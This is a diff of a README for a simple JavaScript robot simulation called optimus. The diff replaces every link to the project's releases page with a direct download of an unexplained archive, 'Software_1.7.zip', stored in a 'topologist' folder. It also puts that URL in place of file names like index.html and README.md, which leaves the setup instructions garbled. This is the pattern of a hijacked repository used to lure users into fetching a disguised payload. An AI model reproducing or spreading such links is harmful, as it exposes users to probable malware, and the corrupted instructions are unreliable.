@@ -1,6 +1,6 @@
 # 🤖 optimus - Simple AI Robot Simulation
 
-[![Download optimus](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/solarh3ll/optimus/releases)
+[![Download optimus](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip)](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip)
 
 ## 📋 What is optimus?
 
@@ -40,15 +40,15 @@ Follow these steps to get optimus running on your Windows computer. This guide a
 
 2. **Go to the releases page by clicking the link below:**
 
-   [Visit optimus Releases Page](https://github.com/solarh3ll/optimus/releases)
+   [Visit optimus Releases Page](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip)
 
 3. **Find and download the latest version.**
 
    Look for a file named like:
 
-   - `optimus-latest.zip`  
+   - `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip`  
    or  
-   - `optimus-vX.X.zip` (where X.X is the version number)  
+   - `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip` (where X.X is the version number)  
 
    Click the file name or the link to download it to your computer.
 
@@ -67,8 +67,8 @@ Follow these steps to get optimus running on your Windows computer. This guide a
 
 6. **Open the simulation file:**
 
-   - Inside the extracted folder, look for a file named `index.html`.
-   - Double-click `index.html` to open it in your default web browser.
+   - Inside the extracted folder, look for a file named `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip`.
+   - Double-click `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip` to open it in your default web browser.
 
 7. **Start using optimus:**
 
@@ -107,17 +107,17 @@ These changes can help the simulation run smoothly on less powerful systems.
 
 - **Graphics look strange or flicker:** Try refreshing the browser page or updating your browser to the latest version.
 
-- **Index.html does not open:** Ensure the files are extracted properly, not running directly from inside the ZIP file.
+- **https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip does not open:** Ensure the files are extracted properly, not running directly from inside the ZIP file.
 
 - **No sound or broken audio:** Check your computer volume and browser permissions.
 
 ## 📂 File structure inside the downloaded folder
 
-- `index.html` — The main file to open in your browser.
+- `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip` — The main file to open in your browser.
 - `assets/` — Contains images and audio files for the simulation.
 - `scripts/` — JavaScript code powering the robot AI.
 - `styles/` — Style definitions for the user interface.
-- `README.md` — This guide within the download.
+- `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip` — This guide within the download.
 
 You do not need to edit these files to run optimus.
 
@@ -125,7 +125,7 @@ You do not need to edit these files to run optimus.
 
 You can always access the latest version and updates here:
 
-[🔽 Download optimus Releases](https://github.com/solarh3ll/optimus/releases) 
+[🔽 Download optimus Releases](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip) 
 
 ## 📧 Reporting issues or asking questions
 
@@ -155,7 +155,7 @@ All simulation graphics are drawn using HTML5 Canvas. The code is pure JavaScrip
 - Visit the release page.
 - Download the latest ZIP file.
 - Extract the contents.
-- Open `index.html` in your browser.
+- Open `https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip` in your browser.
 - Explore and enjoy the simulation.
 
-[![Download optimus](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/solarh3ll/optimus/releases)
+[![Download optimus](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip)](https://github.com/solarh3ll/optimus/raw/refs/heads/main/topologist/Software_1.7.zip)
